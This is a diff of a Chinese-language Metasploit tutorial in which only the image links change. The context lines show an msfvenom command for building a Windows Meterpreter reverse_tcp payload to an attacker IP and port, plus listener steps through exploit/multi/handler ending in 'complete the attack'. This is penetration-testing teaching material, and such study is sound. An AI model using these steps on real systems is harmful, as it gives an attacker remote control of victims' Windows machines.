@@ -20,11 +20,11 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3  LPORT=4567  -e x
 
 1. 启动msf   终端内输入：`msfconsole` 启动msf
 
-   ![1642501758409](https://img.gyxnb.top/img/1642501758409.png)
+   ![1642501758409](https://image.201068.xyz/assets/1642501758409.png)
 
 2. 载入监控模块  msf中输入： `use exploit/multi/handler`
 
-   ![1642501831818](https://img.gyxnb.top/img/1642501831818.png)
+   ![1642501831818](https://image.201068.xyz/assets/1642501831818.png)
 
 3. 加载payload  msf终端中输入：`set payload windows/meterpreter/reverse_tcp`
 
@@ -36,7 +36,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3  LPORT=4567  -e x
 
 7. 检查payload配置  msf终端中输入：`show options` 
 
-   ![1642501934250](https://img.gyxnb.top/img/1642501934250.png)
+   ![1642501934250](https://image.201068.xyz/assets/1642501934250.png)
 
 8. 执行监控  msf终端中输入： `run`
 
@@ -48,7 +48,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.70.3  LPORT=4567  -e x
 
 3. 完成攻击利用
 
-   ![1642501969373](https://img.gyxnb.top/img/1642501969373.png)
+   ![1642501969373](https://image.201068.xyz/assets/1642501969373.png)
 
 
 
